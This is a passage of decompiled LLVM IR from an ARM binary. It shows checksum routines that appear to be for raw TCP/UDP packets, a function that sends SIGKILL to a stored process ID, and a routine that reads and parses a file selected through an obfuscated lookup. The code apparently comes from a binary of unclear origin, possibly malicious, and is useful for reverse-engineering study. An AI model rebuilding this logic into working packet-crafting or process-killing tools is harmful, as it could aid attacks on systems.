  uselistorder i32 %v4_efc8, { 1, 0 }
  uselistorder i32 %v2_efc4, { 0, 2, 1 }
  uselistorder i32 %v1_ef68, { 1, 0, 2 }
  uselistorder i32 %v1_eef8, { 0, 2, 1 }
  uselistorder i32 %v1_eef4, { 1, 0 }
  uselistorder i32 %v2_eeec, { 1, 0 }
  uselistorder i32 %v1_eec0, { 2, 1, 4, 0, 3, 6, 5 }
  uselistorder i32 %v3_ed64, { 1, 0 }
  uselistorder i32 %v3_ed5c, { 1, 0 }
  uselistorder i32 %v1_ed14, { 1, 0 }
  uselistorder i32 %v1_ed0c, { 1, 0 }
  uselistorder i32 %v1_ecf0, { 1, 0 }
  uselistorder i32 %v3_ece8, { 1, 0 }
  uselistorder i32 %v1_ecac, { 1, 0 }
  uselistorder i1 %v7_ec80, { 1, 0 }
  uselistorder i1 %v7_ec50, { 1, 0 }
  uselistorder i32 %v3_ec4c, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_ec38, { 0, 6, 1, 7, 3, 5, 8, 4, 2, 9 }
  uselistorder i32 %v2_ec28, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_ec24, { 1, 0, 2 }
  uselistorder i32 %stack_var_-2188.0, { 1, 0 }
  uselistorder i32 %v1_ebf4, { 1, 0 }
  uselistorder i32 %v0_ebf0, { 1, 0 }
  uselistorder i32 %v1_ebe8, { 1, 0 }
  uselistorder i32 %v1_ebe0, { 1, 2, 0 }
  uselistorder i1 %v7_ebcc, { 1, 0 }
  uselistorder i32 %v1_ebc8, { 1, 0, 2 }
  uselistorder i1 %v8_ebc0, { 1, 0 }
  uselistorder i1 %v7_ebbc, { 1, 0 }
  uselistorder i32 %v1_ebb0, { 1, 0 }
  uselistorder i8 %v2_eba4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_eba8, { 1, 0 }
  uselistorder i32 %v0_ebc8, { 1, 2, 3, 0 }
  uselistorder i32 %v2_eb9c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_eb90, { 1, 0, 2 }
  uselistorder i32 %v2_eb8c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_eb7c, { 1, 0, 2, 5, 3, 4 }
  uselistorder i1 %v7_eb74, { 1, 0 }
  uselistorder i32 %v4_eb64, { 6, 5, 7, 4, 3, 1, 2, 0, 8 }
  uselistorder i32 %v0_eb18, { 1, 0, 2, 3 }
  uselistorder i32 %v6_eab8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_ea9c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_ea84, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v1_ea6c, { 1, 0 }
  uselistorder i32 %v7_ea28, { 1, 0, 3, 2 }
  uselistorder i32 %v6_ea04, { 1, 0 }
  uselistorder i32 %v4_e9ec, { 0, 3, 1, 2 }
  uselistorder i32 %v1_e9c4, { 3, 4, 5, 2, 7, 8, 6, 9, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 1, 12, 10, 11 }
  uselistorder i32* %r4.global-to-local, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 38, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 34, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 9, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 40, 39, 41, 43, 42, 45, 44, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 7, 6, 8, 9, 10, 12, 11, 13, 15, 14, 16, 17, 18, 19, 27, 20, 21, 22, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 36, 35, 37, 38, 39, 40, 42, 41, 43, 44, 46, 45, 47, 49, 48, 51, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 9, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 26, 27 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 35, 1, 2, 3, 4, 5, 6, 11, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36 }
  uselistorder i32 (i8*)* @inet_addr, { 1, 0, 2 }
  uselistorder i32 41, { 4, 5, 6, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i8 46, { 5, 0, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5, 6, 7, 8 }
  uselistorder i32 53, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), { 1, 0 }
  uselistorder i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), { 0, 33, 13, 12, 15, 34, 14, 35, 3, 1, 2, 17, 36, 16, 37, 40, 4, 38, 39, 41, 42, 18, 43, 19, 44, 20, 45, 46, 21, 47, 50, 5, 48, 49, 51, 52, 53, 54, 23, 55, 22, 56, 59, 6, 57, 58, 60, 61, 62, 63, 24, 64, 25, 65, 26, 66, 68, 7, 8, 69, 67, 27, 70, 28, 71, 74, 9, 72, 73, 75, 76, 30, 77, 29, 78, 81, 10, 79, 80, 82, 83, 32, 84, 31, 85, 11, 86 }
  uselistorder label %dec_label_pc_f108, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f0fc, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_efa4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef44, { 1, 0 }
  uselistorder label %.thread39, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb139, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_ebe0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ebd8, { 1, 0 }
  uselistorder label %dec_label_pc_ebcc, { 1, 0 }
}

define i32 @function_f180(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f180:
  call void @__pseudo_cond_branch(i1 false, i32 11156144)
  %v0_f184 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f184, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_f180
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_f180, %bb
  %v10_f184 = load i32, i32* @r0, align 4
  ret i32 %v10_f184

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_f188(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f188:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_f1b8, label %dec_label_pc_f194

dec_label_pc_f194:                                ; preds = %dec_label_pc_f188
  %v0_f198.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f198

dec_label_pc_f198:                                ; preds = %dec_label_pc_f198, %dec_label_pc_f194
  %v0_f1ac = phi i32 [ %v2_f1ac, %dec_label_pc_f198 ], [ 0, %dec_label_pc_f194 ]
  %v0_f1a0 = phi i32 [ %v1_f1a0, %dec_label_pc_f198 ], [ %arg1, %dec_label_pc_f194 ]
  %v0_f1b0 = phi i32 [ %v1_f1b0, %dec_label_pc_f198 ], [ %v0_f198.pre, %dec_label_pc_f194 ]
  %v1_f198 = inttoptr i32 %v0_f1b0 to i8*
  %v2_f198 = load i8, i8* %v1_f198, align 1
  %v3_f198 = zext i8 %v2_f198 to i32
  %v1_f19c = add i32 %v0_f1b0, 1
  %v2_f19c = inttoptr i32 %v1_f19c to i8*
  %v3_f19c = load i8, i8* %v2_f19c, align 1
  %v4_f19c = zext i8 %v3_f19c to i32
  %v1_f1a0 = add i32 %v0_f1a0, -2
  %v4_f1a4 = mul nuw nsw i32 %v4_f19c, 256
  %v5_f1a4 = or i32 %v4_f1a4, %v3_f198
  %v2_f1ac = add i32 %v5_f1a4, %v0_f1ac
  %v1_f1b0 = add i32 %v0_f1b0, 2
  store i32 %v1_f1b0, i32* @r0, align 4
  %v1_f1a0.cmp = icmp ugt i32 %v1_f1a0, 1
  br i1 %v1_f1a0.cmp, label %dec_label_pc_f198, label %dec_label_pc_f1b8

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_f198, %dec_label_pc_f188
  %v1_f1c0 = phi i32 [ 0, %dec_label_pc_f188 ], [ %v2_f1ac, %dec_label_pc_f198 ]
  %v0_f1b8 = phi i32 [ %arg1, %dec_label_pc_f188 ], [ %v1_f1a0, %dec_label_pc_f198 ]
  %v7_f1b8 = icmp eq i32 %v0_f1b8, 1
  br i1 %v7_f1b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1b8
  %v1_f1bc = load i32, i32* @r0, align 4
  %v2_f1bc = inttoptr i32 %v1_f1bc to i8*
  %v3_f1bc = load i8, i8* %v2_f1bc, align 1
  %v4_f1bc = zext i8 %v3_f1bc to i32
  %v3_f1c0 = add i32 %v1_f1c0, %v4_f1bc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1b8, %bb
  %v0_f1c4 = phi i32 [ %v1_f1c0, %dec_label_pc_f1b8 ], [ %v3_f1c0, %bb ]
  %v3_f1c8 = urem i32 %v0_f1c4, 65536
  %v4_f1cc = udiv i32 %v0_f1c4, 65536
  %v5_f1cc = add nuw nsw i32 %v4_f1cc, %v3_f1c8
  %v4_f1d0 = udiv i32 %v5_f1cc, 65536
  %v5_f1d0 = add nuw nsw i32 %v4_f1d0, %v5_f1cc
  %v1_f1d4 = urem i32 %v5_f1d0, 65536
  %v3_f1dc = xor i32 %v1_f1d4, 65535
  ret i32 %v3_f1dc

; uselistorder directives
  uselistorder i32 %v5_f1cc, { 1, 0 }
  uselistorder i32 %v1_f1b0, { 1, 0 }
  uselistorder i32 %v1_f1a0, { 1, 0, 2 }
  uselistorder i32 %v0_f1b0, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f1e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f1e4:
  %v3_f1f4 = urem i32 %arg2, 65536
  %v1_f1f8 = add i32 %arg1, 12
  %v1_f1fc = inttoptr i32 %v1_f1f8 to i32*
  %v2_f1fc = load i32, i32* %v1_f1fc, align 4
  %v3_f1fc = add i32 %arg1, 16
  %v4_f1fc = inttoptr i32 %v3_f1fc to i32*
  %v5_f1fc = load i32, i32* %v4_f1fc, align 4
  %v7_f200 = icmp sgt i32 %arg3, 1
  br i1 %v7_f200, label %dec_label_pc_f20c.preheader, label %dec_label_pc_f22c

dec_label_pc_f20c.preheader:                      ; preds = %dec_label_pc_f1e4
  %v0_f20c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f20c

dec_label_pc_f20c:                                ; preds = %dec_label_pc_f20c.preheader, %dec_label_pc_f20c
  %v0_f220 = phi i32 [ 0, %dec_label_pc_f20c.preheader ], [ %v2_f220, %dec_label_pc_f20c ]
  %v0_f214 = phi i32 [ %arg3, %dec_label_pc_f20c.preheader ], [ %v1_f214, %dec_label_pc_f20c ]
  %v0_f224 = phi i32 [ %v0_f20c.pre, %dec_label_pc_f20c.preheader ], [ %v1_f224, %dec_label_pc_f20c ]
  %v1_f20c = inttoptr i32 %v0_f224 to i8*
  %v2_f20c = load i8, i8* %v1_f20c, align 1
  %v3_f20c = zext i8 %v2_f20c to i32
  %v1_f210 = add i32 %v0_f224, 1
  %v2_f210 = inttoptr i32 %v1_f210 to i8*
  %v3_f210 = load i8, i8* %v2_f210, align 1
  %v4_f210 = zext i8 %v3_f210 to i32
  %v1_f214 = add nsw i32 %v0_f214, -2
  %v4_f218 = mul nuw nsw i32 %v4_f210, 256
  %v5_f218 = or i32 %v4_f218, %v3_f20c
  %v2_f220 = add i32 %v5_f218, %v0_f220
  %v1_f224 = add i32 %v0_f224, 2
  store i32 %v1_f224, i32* @r1, align 4
  %v8_f228 = icmp sgt i32 %v1_f214, 1
  br i1 %v8_f228, label %dec_label_pc_f20c, label %dec_label_pc_f22c

dec_label_pc_f22c:                                ; preds = %dec_label_pc_f20c, %dec_label_pc_f1e4
  %v1_f234 = phi i32 [ 0, %dec_label_pc_f1e4 ], [ %v2_f220, %dec_label_pc_f20c ]
  %v0_f22c = phi i32 [ %arg3, %dec_label_pc_f1e4 ], [ %v1_f214, %dec_label_pc_f20c ]
  %v7_f22c = icmp eq i32 %v0_f22c, 1
  br i1 %v7_f22c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f22c
  %v1_f230 = load i32, i32* @r1, align 4
  %v2_f230 = inttoptr i32 %v1_f230 to i8*
  %v3_f230 = load i8, i8* %v2_f230, align 1
  %v4_f230 = zext i8 %v3_f230 to i32
  %v3_f234 = add i32 %v4_f230, %v1_f234
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f22c, %bb
  %v0_f258 = phi i32 [ %v1_f234, %dec_label_pc_f22c ], [ %v3_f234, %bb ]
  %v3_f23c = urem i32 %v2_f1fc, 65536
  %v1_f244 = add i32 %arg1, 9
  %v2_f244 = inttoptr i32 %v1_f244 to i8*
  %v3_f244 = load i8, i8* %v2_f244, align 1
  %v4_f244 = zext i8 %v3_f244 to i32
  %v3_f248 = urem i32 %v5_f1fc, 65536
  %v4_f24c = udiv i32 %v2_f1fc, 65536
  %v3_f254 = mul nuw nsw i32 %v4_f244, 256
  %v4_f258 = udiv i32 %v5_f1fc, 65536
  %v5_f258 = add i32 %v0_f258, %v4_f258
  %v2_f25c = add i32 %v5_f258, %v3_f254
  %v5_f24c = add nuw nsw i32 %v3_f23c, %v3_f1f4
  %v2_f250 = add nuw nsw i32 %v5_f24c, %v4_f24c
  %v2_f260 = add nuw nsw i32 %v2_f250, %v3_f248
  %v2_f264 = add i32 %v2_f25c, %v2_f260
  %tmp = icmp ult i32 %v2_f264, 65536
  br i1 %tmp, label %dec_label_pc_f284, label %dec_label_pc_f270

dec_label_pc_f270:                                ; preds = %.thread, %dec_label_pc_f270
  %v2_f2781 = phi i32 [ %v2_f278, %dec_label_pc_f270 ], [ %v2_f264, %.thread ]
  %v3_f27c2.in = phi i32 [ %v2_f278, %dec_label_pc_f270 ], [ %v2_f264, %.thread ]
  %v3_f27c2 = udiv i32 %v3_f27c2.in, 65536
  %v3_f274 = urem i32 %v2_f2781, 65536
  %v2_f278 = add nuw nsw i32 %v3_f274, %v3_f27c2
  %tmp14 = icmp ult i32 %v2_f278, 65536
  br i1 %tmp14, label %dec_label_pc_f284.loopexit, label %dec_label_pc_f270

dec_label_pc_f284.loopexit:                       ; preds = %dec_label_pc_f270
  br label %dec_label_pc_f284

dec_label_pc_f284:                                ; preds = %dec_label_pc_f284.loopexit, %.thread
  %v0_f284 = phi i32 [ %v2_f278, %dec_label_pc_f284.loopexit ], [ %v2_f264, %.thread ]
  %v1_f284 = urem i32 %v0_f284, 65536
  %v3_f28c = xor i32 %v1_f284, 65535
  ret i32 %v3_f28c

; uselistorder directives
  uselistorder i32 %v2_f278, { 2, 1, 3, 0 }
  uselistorder i32 %v2_f264, { 3, 0, 2, 1 }
  uselistorder i32 %v1_f234, { 1, 0 }
  uselistorder i32 %v1_f224, { 1, 0 }
  uselistorder i32 %v1_f214, { 0, 2, 1 }
  uselistorder i32 %v0_f224, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f270, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f20c, { 1, 0 }
}

define i32 @function_f294(i32 %arg1) local_unnamed_addr {
dec_label_pc_f294:
  %v2_f298 = load i32, i32* @global_var_1c1c4.146, align 4
  %v2_f2a0 = call i32 @kill(i32 %v2_f298, i32 9)
  %v0_f2a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f2a4, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_f294
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_f294, %bb
  ret i32 %v2_f2a0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_f2a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f2a8:
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f2a8 = load i32, i32* @r4, align 4
  store i32 %v3_f2a8, i32* %stack_var_-36, align 4
  %v6_f2a8 = load i32, i32* @r5, align 4
  %v9_f2a8 = load i32, i32* @r6, align 4
  %v12_f2a8 = load i32, i32* @r7, align 4
  %v15_f2a8 = load i32, i32* @r8, align 4
  %v21_f2a8 = load i32, i32* @sl, align 4
  %v2_f2bc = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_f2bc, i32* @sl, align 4
  %v3_f2c4 = mul i32 %arg1, 65536
  store i32 %v3_f2c4, i32* @r5, align 4
  %v2_f2d0 = ptrtoint i32* %stack_var_-8773 to i32
  %v4_f2dc = call i32* @memset(i32* nonnull %stack_var_-4677, i32 0, i32 4096)
  %v0_f2f0 = load i32, i32* @r5, align 4
  %v3_f2f0 = udiv i32 %v0_f2f0, 65536
  store i32 %v3_f2f0, i32* %r4.global-to-local, align 4
  %v4_f2f4 = call i32* @memset(i32* nonnull %stack_var_-8773, i32 0, i32 4096)
  %v2_f2f8 = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_f2f8, i32* @r6, align 4
  %v1_f300 = mul nuw nsw i32 %v3_f2f0, 256
  %v3_f30c = and i32 %v1_f300, 65280
  store i32 %v3_f30c, i32* %r4.global-to-local, align 4
  %v2_f314 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f314, i32* %sb.global-to-local, align 4
  %v3_f318 = bitcast i8* %stack_var_-581 to i32*
  %v4_f318 = call i32* @memset(i32* %v3_f318, i32 0, i32 513)
  %v2_f31c = ptrtoint i8* %stack_var_-68 to i32
  store i32 %v2_f31c, i32* %sb.global-to-local, align 4
  %v0_f324 = load i32, i32* %r4.global-to-local, align 4
  %v1_f324 = load i32, i32* @r5, align 4
  %v4_f324 = udiv i32 %v1_f324, 16777216
  %v5_f324 = or i32 %v4_f324, %v0_f324
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_f344 = trunc i32 %v5_f324 to i8
  %v4_f344 = call i32 @function_13228(i8 %v3_f344, i32 16, i32 %v2_f31c)
  %v2_f34c = call i32 @function_12d34(i8* nonnull %stack_var_-68)
  %v7_f350 = icmp eq i32 %v2_f34c, 2
  br i1 %v7_f350, label %dec_label_pc_f7fc, label %dec_label_pc_f358

dec_label_pc_f358:                                ; preds = %dec_label_pc_f2a8, %dec_label_pc_f7fc
  %v1_f35c = call i32 @function_12280(i32 6)
  %v1_f364 = call i32 @function_12280(i32 7)
  %v1_f36c = call i32 @function_12280(i32 8)
  %v1_f374 = call i32 @function_12280(i32 9)
  %v0_f378 = load i32, i32* @r4, align 4
  %v2_f380 = inttoptr i32 %v0_f378 to i32*
  %v3_f380 = call i32 @function_1219c(i32 9, i32* %v2_f380)
  %v4_f380 = inttoptr i32 %v3_f380 to i8*
  %v0_f384 = load i32, i32* @r4, align 4
  %v4_f388 = call i32 (i8*, i32, ...) @open(i8* %v4_f380, i32 %v0_f384)
  %v7_f38c = icmp eq i32 %v4_f388, -1
  store i32 %v4_f388, i32* @r8, align 4
  br i1 %v7_f38c, label %dec_label_pc_f7bc, label %dec_label_pc_f398.preheader

dec_label_pc_f398.preheader:                      ; preds = %dec_label_pc_f358
  %v4_f3a454 = call i32 @function_12f8c(i32* %v3_f318, i32 512, i32 %v4_f388)
  %v2_f3a856 = icmp eq i32 %v4_f3a454, 0
  br i1 %v2_f3a856, label %dec_label_pc_f538.loopexit, label %dec_label_pc_f3b0.lr.ph

dec_label_pc_f3b0.lr.ph:                          ; preds = %dec_label_pc_f398.preheader
  %v2_f3f8 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_f3b0

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_f3b0.lr.ph, %dec_label_pc_f398.backedge
  %v3_f3b4 = load i8, i8* %stack_var_-581, align 1
  %v4_f3b4 = sext i8 %v3_f3b4 to i32
  %v2_f3b8 = icmp eq i8 %v3_f3b4, 0
  br i1 %v2_f3b8, label %bb125, label %bb

bb:                                               ; preds = %dec_label_pc_f3b0
  %v8_f3bc = icmp eq i8 %v3_f3b4, 58
  br i1 %v8_f3bc, label %.thread6, label %dec_label_pc_f3d0

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_f3e8

bb125:                                            ; preds = %dec_label_pc_f3b0
  br label %dec_label_pc_f3e8

dec_label_pc_f3d0:                                ; preds = %bb
  %v1_f3d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f3d4

dec_label_pc_f3d4:                                ; preds = %bb126, %dec_label_pc_f3d0
  %v0_f3d4 = phi i32 [ %v1_f3d4, %bb126 ], [ 0, %dec_label_pc_f3d0 ]
  %v1_f3d4 = add i32 %v0_f3d4, 1
  %v2_f3d8 = add i32 %v1_f3d4, %v1_f3d8.pre
  %v3_f3d8 = inttoptr i32 %v2_f3d8 to i8*
  %v4_f3d8 = load i8, i8* %v3_f3d8, align 1
  %v6_f3d8 = zext i8 %v4_f3d8 to i32
  %v2_f3dc = icmp eq i8 %v4_f3d8, 0
  br i1 %v2_f3dc, label %dec_label_pc_f3e8, label %bb126

bb126:                                            ; preds = %dec_label_pc_f3d4
  %v8_f3e0 = icmp eq i8 %v4_f3d8, 58
  br i1 %v8_f3e0, label %dec_label_pc_f3e8, label %dec_label_pc_f3d4

dec_label_pc_f3e8:                                ; preds = %dec_label_pc_f3d4, %bb126, %bb125, %.thread6
  %v1_f414 = phi i32 [ 0, %.thread6 ], [ 0, %bb125 ], [ %v1_f3d4, %bb126 ], [ %v1_f3d4, %dec_label_pc_f3d4 ]
  %v0_f3e8 = phi i32 [ %v4_f3b4, %.thread6 ], [ %v4_f3b4, %bb125 ], [ %v6_f3d8, %bb126 ], [ %v6_f3d8, %dec_label_pc_f3d4 ]
  %v2_f3e8 = icmp eq i32 %v0_f3e8, 0
  br i1 %v2_f3e8, label %dec_label_pc_f398.backedge, label %dec_label_pc_f3f0

dec_label_pc_f398.backedge:                       ; preds = %dec_label_pc_f3e8, %dec_label_pc_f4c0, %dec_label_pc_f50c, %dec_label_pc_f434
  %v0_f3a0 = load i32, i32* @r8, align 4
  %v4_f3a4 = call i32 @function_12f8c(i32* %v3_f318, i32 512, i32 %v0_f3a0)
  %v2_f3a8 = icmp eq i32 %v4_f3a4, 0
  br i1 %v2_f3a8, label %dec_label_pc_f538.loopexit, label %dec_label_pc_f3b0

dec_label_pc_f3f0:                                ; preds = %dec_label_pc_f3e8
  %v1_f3f4 = add i32 %v1_f414, 2
  %v2_f3fc = add i32 %v1_f3f4, %v2_f3f8
  %v1_f400 = add i32 %v2_f3fc, -545
  %v2_f400 = inttoptr i32 %v1_f400 to i8*
  %v3_f400 = load i8, i8* %v2_f400, align 1
  %v2_f404 = icmp eq i8 %v3_f400, 0
  br i1 %v2_f404, label %bb128, label %bb127

bb127:                                            ; preds = %dec_label_pc_f3f0
  %v8_f408 = icmp eq i8 %v3_f400, 32
  br i1 %v8_f408, label %.thread10, label %dec_label_pc_f414

.thread10:                                        ; preds = %bb127
  store i32 %v1_f3f4, i32* @r5, align 4
  br label %dec_label_pc_f434

bb128:                                            ; preds = %dec_label_pc_f3f0
  store i32 %v1_f3f4, i32* @r5, align 4
  br label %dec_label_pc_f434

dec_label_pc_f414:                                ; preds = %bb127
  %v0_f414 = load i32, i32* @r6, align 4
  %v2_f414 = add i32 %v0_f414, %v1_f414
  br label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %bb129, %dec_label_pc_f414
  %v0_f42413 = phi i32 [ %v1_f424, %bb129 ], [ %v2_f414, %dec_label_pc_f414 ]
  %v1_f418 = add i32 %v0_f42413, 3
  %v2_f418 = inttoptr i32 %v1_f418 to i8*
  %v3_f418 = load i8, i8* %v2_f418, align 1
  %v2_f41c = icmp eq i8 %v3_f418, 0
  br i1 %v2_f41c, label %.thread12, label %bb129

.thread12:                                        ; preds = %dec_label_pc_f418
  %v1_f42414 = add i32 %v0_f42413, 1
  br label %dec_label_pc_f42c

bb129:                                            ; preds = %dec_label_pc_f418
  %v8_f420 = icmp eq i8 %v3_f418, 32
  %v1_f424 = add i32 %v0_f42413, 1
  br i1 %v8_f420, label %dec_label_pc_f42c, label %dec_label_pc_f418

dec_label_pc_f42c:                                ; preds = %bb129, %.thread12
  %v1_f42415 = phi i32 [ %v1_f42414, %.thread12 ], [ %v1_f424, %bb129 ]
  %v2_f42c = sub i32 %v1_f42415, %v0_f414
  %v1_f430 = add i32 %v2_f42c, 2
  store i32 %v1_f430, i32* @r5, align 4
  br label %dec_label_pc_f434

dec_label_pc_f434:                                ; preds = %bb128, %.thread10, %dec_label_pc_f42c
  %v1_f440 = phi i32 [ %v1_f3f4, %.thread10 ], [ %v1_f3f4, %bb128 ], [ %v1_f430, %dec_label_pc_f42c ]
  %v0_f434 = load i32, i32* @r6, align 4
  %v2_f434 = add i32 %v0_f434, %v1_f3f4
  store i32 %v2_f434, i32* @r4, align 4
  %v2_f440 = add i32 %v1_f440, %v2_f3f8
  store i32 0, i32* @r7, align 4
  %v3_f44c = add i32 %v2_f440, -545
  %v4_f44c = inttoptr i32 %v3_f44c to i8*
  store i8 0, i8* %v4_f44c, align 1
  %v1_f450 = inttoptr i32 %v2_f434 to i8*
  %v2_f450 = call i32 @function_12d34(i8* %v1_f450)
  store i32 %v2_f450, i32* @r1, align 4
  %v0_f45c = load i32, i32* @r4, align 4
  %v3_f460 = inttoptr i32 %v0_f45c to i8*
  %v4_f460 = call i32 @function_13088(i8* %v3_f460, i32 %v2_f450, i32 %v2_f31c)
  %v7_f464 = icmp eq i32 %v4_f460, -1
  br i1 %v7_f464, label %dec_label_pc_f398.backedge, label %dec_label_pc_f480.preheader

dec_label_pc_f480.preheader:                      ; preds = %dec_label_pc_f434
  %v1_f468 = load i32, i32* @r7, align 4
  %v1_f46c = load i32, i32* @r6, align 4
  %v2_f46c = load i32, i32* @r5, align 4
  %v3_f46c = add i32 %v2_f46c, %v1_f46c
  store i32 %v1_f468, i32* @r4, align 4
  %v1_f48046 = add i32 %v3_f46c, 2
  %v2_f48047 = inttoptr i32 %v1_f48046 to i8*
  %v3_f48048 = load i8, i8* %v2_f48047, align 1
  %v2_f48450 = icmp eq i8 %v3_f48048, 0
  %v1_f48852 = add i32 %v2_f46c, 2
  br i1 %v2_f48450, label %dec_label_pc_f4c0, label %dec_label_pc_f490

dec_label_pc_f490:                                ; preds = %dec_label_pc_f480.preheader, %dec_label_pc_f480.backedge
  %v0_f4c082 = phi i32 [ %v0_f4c081, %dec_label_pc_f480.backedge ], [ %v1_f468, %dec_label_pc_f480.preheader ]
  %v0_f4a8.pr = phi i32 [ %v0_f4a8.pr67, %dec_label_pc_f480.backedge ], [ %v1_f468, %dec_label_pc_f480.preheader ]
  %v0_f7cc = phi i32 [ %v0_f7cc70, %dec_label_pc_f480.backedge ], [ %v1_f468, %dec_label_pc_f480.preheader ]
  %v0_f48878 = phi i32 [ %v1_f488, %dec_label_pc_f480.backedge ], [ %v1_f48852, %dec_label_pc_f480.preheader ]
  %v0_f4b8 = phi i32 [ %v0_f480, %dec_label_pc_f480.backedge ], [ %v3_f46c, %dec_label_pc_f480.preheader ]
  %v1_f494.in = phi i8 [ %v3_f480, %dec_label_pc_f480.backedge ], [ %v3_f48048, %dec_label_pc_f480.preheader ]
  %v7_f490 = icmp eq i8 %v1_f494.in, 9
  br i1 %v7_f490, label %.thread23, label %bb130

bb130:                                            ; preds = %dec_label_pc_f490
  %v8_f494 = icmp eq i8 %v1_f494.in, 32
  br i1 %v8_f494, label %.thread23.thread35, label %dec_label_pc_f4a8

.thread23.thread35:                               ; preds = %bb130
  br label %dec_label_pc_f4b4

.thread23:                                        ; preds = %dec_label_pc_f490
  br label %dec_label_pc_f4b4

dec_label_pc_f4a8:                                ; preds = %bb130
  %v7_f4a8 = icmp eq i32 %v0_f4a8.pr, 1
  br i1 %v7_f4a8, label %dec_label_pc_f7cc, label %dec_label_pc_f4b0

